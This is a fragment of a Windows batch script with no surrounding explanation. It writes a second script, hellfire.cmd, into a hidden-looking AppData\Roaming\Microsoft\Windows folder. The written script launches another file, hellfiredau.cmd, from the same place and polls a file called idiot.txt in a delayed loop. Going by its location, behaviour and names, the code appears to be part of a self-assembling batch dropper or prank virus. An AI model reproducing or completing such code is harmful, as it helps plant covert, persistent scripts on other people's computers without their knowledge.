...
echo start "" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfiredau.cmd" >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo :rp >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo @ping /n 10 localhost^> nul >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo set /p dau=^<idiot.txt >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo if %%dau%%==nulll goto rp >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo set /p dau=^<idiot.txt >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
